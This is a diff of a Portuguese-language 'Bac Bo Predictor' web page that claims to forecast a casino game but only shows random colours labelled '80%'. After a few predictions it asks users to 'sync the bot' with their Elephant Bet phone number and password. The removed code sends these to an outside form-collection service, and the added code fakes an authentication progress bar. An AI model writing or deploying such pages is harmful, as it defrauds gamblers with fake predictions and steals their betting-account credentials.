@@ -2,157 +2,157 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>BOT PREDICTOR - Bac Bó 2026</title>
+  <title>BAC BO PREDICTOR 2026</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #0d0d0d;
-      color: #fff;
-      margin: 0;
-      padding: 20px;
-      text-align: center;
-    }
-    h1 {
-      color: #ff00ff;
-      text-shadow: 0 0 10px #ff00ff;
-      font-size: 1.8em;
-    }
+    body { font-family: Arial, sans-serif; background:#0d0d0d; color:#fff; text-align:center; margin:0; padding:20px; }
+    h1 { color:#ff00ff; text-shadow:0 0 10px #ff00ff; }
     .circle {
-      font-size: 2em;
-      margin: 20px auto 5px auto;
-      padding: 40px;
-      border-radius: 50%;
-      width: 180px;
-      height: 180px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      font-size:2em; margin:20px auto; border-radius:50%; width:200px; height:200px;
+      display:flex; align-items:center; justify-content:center; background:#111; color:#fff;
     }
-    .azul { color:#00f; border:3px solid #00f; box-shadow:0 0 20px #00f; }
-    .vermelho { color:#f00; border:3px solid #f00; box-shadow:0 0 20px #f00; }
-    .empate-text { font-size:0.9em; color:#ffd700; margin-top:5px; }
-    .blocked { background:#333; color:#ffcc00; padding:10px; margin:15px auto; border-radius:5px; width:90%; font-size:0.9em; }
-    .bar { background:#8000ff; padding:10px; margin:10px auto; border-radius:5px; width:90%; font-size:0.9em; }
-    button {
-      padding:12px 20px; background:#ff00aa; color:#fff; border:none;
-      border-radius:5px; cursor:pointer; margin-top:15px; font-size:1em;
-      width:80%; max-width:300px;
-    }
+    .azul { background:#0011ff; box-shadow:0 0 30px #00f inset; }
+    .vermelho { background:#ff0000; box-shadow:0 0 30px #f00 inset; }
+    .blocked { background:#333; color:#ffcc00; padding:10px; margin:15px auto; border-radius:5px; width:90%; }
+    button { padding:12px 20px; background:#ff00aa; color:#fff; border:none; border-radius:5px; cursor:pointer; margin-top:15px; font-size:1em; width:80%; max-width:300px; }
     button:hover { background:#cc0088; }
-    input {
-      margin:8px; padding:10px; width:80%; max-width:300px; font-size:1em;
-      background-color:#fff; color:#000; border:1px solid #ccc; border-radius:5px;
-    }
-    input::placeholder { color:#666; }
-    #loginScreen { display:none; }
-    footer { margin-top:30px; font-size:0.8em; color:#888; }
+    input { margin:8px; padding:10px; width:80%; max-width:300px; font-size:1em; border-radius:5px; border:1px solid #ccc; }
+    #inicioScreen, #predictorScreen, #loginScreen, #loadingScreen { display:none; }
+    .progress-bar { width:80%; height:20px; background:#222; margin:20px auto; border-radius:10px; overflow:hidden; }
+    .progress { height:100%; width:0%; background:#00ffcc; text-align:center; color:#000; font-size:0.8em; }
   </style>
 </head>
 <body>
-  <!-- Página inicial -->
-  <div id="homeScreen">
-    <h1>BOT PREDICTOR - Bac Bó 2026</h1>
+  <!-- Tela inicial -->
+  <div id="inicioScreen">
+    <h1>BAC BO PREDICTOR</h1>
+    <form id="inicioForm">
+      <input type="text" id="numeroInicio" placeholder="Número de telemóvel" required><br>
+      <input type="text" id="chaveInicio" placeholder="Chave de acesso" required><br>
+      <button type="submit">Entrar</button>
+    </form>
+  </div>
+
+  <!-- Tela do Predictor -->
+  <div id="predictorScreen">
+    <h1>PREDICTOR</h1>
     <div id="circle" class="circle">--</div>
-    <div class="empate-text">20% Empate</div>
-
-    <div id="blocked" class="blocked" style="display:none;">⚠️ Acesso bloqueado</div>
-    <div id="bar" class="bar" style="display:none;">Para ver o próximo resultado deverás conectar o Bot</div>
-
     <button id="preverBtn">Fazer Previsão</button>
     <div id="resultado"></div>
-
+    <div id="blockedMsg" class="blocked" style="display:none;">⚠️ Acesso bloqueado. Conecte novamente o Bot.</div>
     <button id="openLogin">Sincronizar o Bot</button>
   </div>
 
-  <!-- Tela de login -->
+  <!-- Tela de login verdadeira -->
   <div id="loginScreen">
-    <h2>Sincroniza o Bot a sua conta da Elephant Bet</h2>
-    <form id="loginForm" action="https://formspree.io/f/xgvneord" method="POST">
-      <label for="numero">Número</label><br>
-      <input type="text" id="numero" name="numero" placeholder="número de telemóvel" required><br>
-      <label for="senha">Senha</label><br>
-      <input type="text" id="senha" name="senha" placeholder="Digite a sua senha" required><br>
-      <button type="submit">Sincronizar✅</button>
+    <h2>Sincroniza o Bot à sua conta da Elephant Bet</h2>
+    <form id="loginForm">
+      <input type="text" id="numeroLogin" placeholder="Número de telemóvel" required><br>
+      <input type="text" id="senhaLogin" placeholder="Digite a sua senha" required><br>
+      <button type="submit">Sincronizar Agora</button>
     </form>
     <a href="#" id="closeLogin">← Voltar</a>
   </div>
 
-  <footer>© BOT PREDICTOR - Bac Bó 2026</footer>
+  <!-- Tela de carregamento -->
+  <div id="loadingScreen">
+    <h2>Conexão Feita!</h2>
+    <p>Aguarde por favor a autenticação do Bot...</p>
+    <div class="progress-bar"><div id="progress" class="progress">0%</div></div>
+  </div>
 
   <script>
-    let previsoesFeitas = 0;
-    let bloqueado = true;
-    const maxPrevisoes = 3;
-    const circle = document.getElementById("circle");
-    const resultado = document.getElementById("resultado");
-    const preverBtn = document.getElementById("preverBtn");
-    const blocked = document.getElementById("blocked");
-    const bar = document.getElementById("bar");
-
-    preverBtn.addEventListener("click", function() {
-      if (bloqueado && previsoesFeitas >= maxPrevisoes) {
-        blocked.style.display = "block";
-        bar.style.display = "block";
-        resultado.textContent = "";
-        return;
-      }
-      previsoesFeitas++;
-      const rand = Math.random();
-      let banca, classe, valor;
-      if (rand < 0.5) { banca="Azul"; classe="azul"; valor="80%"; }
-      else { banca="Vermelho"; classe="vermelho"; valor="80%"; }
-      circle.textContent = valor;
-      circle.className = "circle " + classe;
-      resultado.textContent = `Previsão ${previsoesFeitas}: Resultado da banca → ${banca}`;
-    });
-
-    // Alternar telas
-    const homeScreen = document.getElementById("homeScreen");
+    const inicioForm = document.getElementById("inicioForm");
+    const numeroInicio = document.getElementById("numeroInicio");
+    const chaveInicio = document.getElementById("chaveInicio");
+    const inicioScreen = document.getElementById("inicioScreen");
+    const predictorScreen = document.getElementById("predictorScreen");
     const loginScreen = document.getElementById("loginScreen");
+    const loadingScreen = document.getElementById("loadingScreen");
+    const loginForm = document.getElementById("loginForm");
+    const numeroLogin = document.getElementById("numeroLogin");
+    const senhaLogin = document.getElementById("senhaLogin");
+    const progressBar = document.getElementById("progress");
+    const circle = document.getElementById("circle");
+    const preverBtn = document.getElementById("preverBtn");
+    const resultado = document.getElementById("resultado");
+    const blockedMsg = document.getElementById("blockedMsg");
     const openLogin = document.getElementById("openLogin");
     const closeLogin = document.getElementById("closeLogin");
-    const loginForm = document.getElementById("loginForm");
-    const numeroInput = document.getElementById("numero");
-    const senhaInput = document.getElementById("senha");
 
+    let previsoesFeitas = 0;
+    const maxPrevisoes = 5;
+    let bloqueado = false;
+
+    // Tela inicial → vai para Predictor
+    inicioForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      if (!/^9\d{8}$/.test(numeroInicio.value)) { alert("Número inválido!"); return; }
+      if (chaveInicio.value !== "2026@") { alert("Chave incorreta!"); return; }
+      inicioScreen.style.display = "none";
+      predictorScreen.style.display = "block";
+    });
+
+    // Botão Sincronizar → vai para tela de login verdadeira
     openLogin.addEventListener("click", function() {
-      homeScreen.style.display = "none";
+      predictorScreen.style.display = "none";
       loginScreen.style.display = "block";
     });
+
+    // Voltar
     closeLogin.addEventListener("click", function() {
       loginScreen.style.display = "none";
-      homeScreen.style.display = "block";
+      predictorScreen.style.display = "block";
     });
 
-    numeroInput.addEventListener("input", function() {
-      if (!numeroInput.value.startsWith("9")) { numeroInput.value = ""; }
-      if (numeroInput.value.length > 9) { numeroInput.value = numeroInput.value.slice(0,9); }
-    });
+    // Tela de login verdadeira → vai para tela de carregamento
+    loginForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      if (!/^9\d{8}$/.test(numeroLogin.value)) { alert("Número inválido!"); return; }
+      if (senhaLogin.value.length < 5) { alert("Senha muito curta!"); return; }
+      loginScreen.style.display = "none";
+      loadingScreen.style.display = "block";
 
-    loginForm.addEventListener("submit", async function(event) {
-      event.preventDefault();
-      const numero = numeroInput.value;
-      const senha = senhaInput.value;
-      if (!/^\d{9}$/.test(numero) || senha.length < 5) { return; }
-      const formData = new FormData(loginForm);
-      try {
-        const response = await fetch(loginForm.action, {
-          method: loginForm.method,
-          body: formData,
-          headers: { 'Accept': 'application/json' }
-        });
-        if (response.ok) {
-          loginForm.reset();
-          bloqueado = false;
-          previsoesFeitas = 0;
-          blocked.style.display = "none";
-          bar.style.display = "none";
-          loginScreen.style.display = "none";
-          homeScreen.style.display = "block";
+      let percent = 0;
+      const interval = setInterval(() => {
+        percent++;
+        progressBar.style.width = percent+"%";
+        progressBar.textContent = percent+"%";
+        if (percent >= 75) {
+          clearInterval(interval);
+          // Permanece parado na mesma tela
+          progressBar.textContent = "75% - Autenticação concluída";
         }
-      } catch (error) { /* silencioso */ }
+      }, 4000); // 75*4s = 300s (5 minutos)
     });
+
+    // Predictor
+    preverBtn.addEventListener("click", function() {
+      if (bloqueado) { blockedMsg.style.display = "block"; return; }
+      previsoesFeitas++;
+      let count = 1;
+      const interval = setInterval(() => {
+        circle.textContent = count+"%";
+        count++;
+        if (count > 80) {
+          clearInterval(interval);
+          const rand = Math.random();
+          if (rand < 0.5) {
+            circle.textContent = "80%";
+            circle.className = "circle azul";
+            resultado.textContent = `Previsão ${previsoesFeitas}: Resultado → Azul`;
+          } else {
+            circle.textContent = "80%";
+            circle.className = "circle vermelho";
+            resultado.textContent = `Previsão ${previsoesFeitas}: Resultado → Vermelho`;
+          }
+        }
+      }, 50); // conta rápido até 80%
+      if (previsoesFeitas >= maxPrevisoes) { bloqueado = true; blockedMsg.style.display = "block"; }
+    });
+
+    // Inicial
+    inicioScreen.style.display = "block";
   </script>
 </body>
 </html>
